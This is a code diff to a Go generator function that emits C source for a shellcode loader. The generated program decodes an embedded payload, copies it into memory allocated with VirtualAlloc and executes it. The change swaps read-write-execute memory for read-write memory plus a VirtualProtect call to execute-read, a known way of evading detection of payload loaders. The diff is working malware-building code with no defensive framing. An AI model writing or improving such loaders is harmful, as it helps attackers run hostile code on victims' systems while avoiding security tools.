@@ -105,9 +105,11 @@ func genC(payload, key []byte) string {
 	if len(key) > 0 {
 		sb.WriteString("    decode();\n")
 	}
-	sb.WriteString("    void *mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n")
+	sb.WriteString("    void *mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n")
 	sb.WriteString("    if (mem) {\n")
 	sb.WriteString("        memcpy(mem, payload, payload_len);\n")
+	sb.WriteString("        DWORD oldProtect;\n")
+	sb.WriteString("        VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);\n")
 	sb.WriteString("        ((void(*)())mem)();\n")
 	sb.WriteString("    }\n")
 	sb.WriteString("    return 0;\n")
